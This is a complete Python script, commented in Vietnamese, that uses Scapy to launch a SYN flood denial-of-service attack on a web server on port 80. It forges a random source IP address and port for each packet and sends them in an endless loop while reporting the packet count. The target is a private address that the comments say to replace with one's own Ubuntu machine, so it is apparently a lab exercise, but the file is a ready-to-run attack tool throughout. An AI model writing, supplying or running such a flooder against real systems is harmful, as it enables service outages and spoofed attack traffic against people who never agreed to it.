#!/usr/bin/env python3
from scapy.all import *
import random

# ==========================================
# CẤU HÌNH MỤC TIÊU (Thay đổi IP này thành IP của máy Ubuntu)
# ==========================================
target_ip = "192.168.5.130"  # <--- BẠN XÓA CHỮ NÀY VÀ ĐIỀN IP UBUNTU VÀO ĐÂY
target_port = 80           # Cổng Web Server (Apache) mặc định

def syn_flood():
    print(f"[+] Đang khởi động chiến dịch SYN Flood vào mục tiêu {target_ip}:{target_port}...")
    print("[+] Bấm Ctrl + C để dừng tấn công.\n")
    
    packet_count = 0
    
    try:
        while True:
            # Bước 1: Tạo IP nguồn giả mạo ngẫu nhiên (IP Spoofing)
            spoofed_ip = f"{random.randint(1, 254)}.{random.randint(1, 254)}.{random.randint(1, 254)}.{random.randint(1, 254)}"
            
            # Bước 2: Tạo Port nguồn ngẫu nhiên
            spoofed_port = random.randint(1024, 65535)
            
            # Bước 3: Nhào nặn gói tin với cờ SYN (flags="S")
            ip_layer = IP(src=spoofed_ip, dst=target_ip)
            tcp_layer = TCP(sport=spoofed_port, dport=target_port, flags="S")
            
            packet = ip_layer / tcp_layer
            
            # Bước 4: Khai hỏa (Gửi gói tin đi)
            send(packet, verbose=0)
            
            # Đếm số lượng gói tin để hiển thị cho đẹp
            packet_count += 1
            if packet_count % 100 == 0:
                print(f"[*] Đã bơm {packet_count} gói tin SYN giả mạo vào Server...")
                
    except KeyboardInterrupt:
        # Xử lý khi bạn bấm Ctrl+C để dừng
        print(f"\n[-] Đã ngừng tấn công. Tổng số đạn (gói tin) đã bắn: {packet_count}")

if __name__ == "__main__":
    syn_flood()
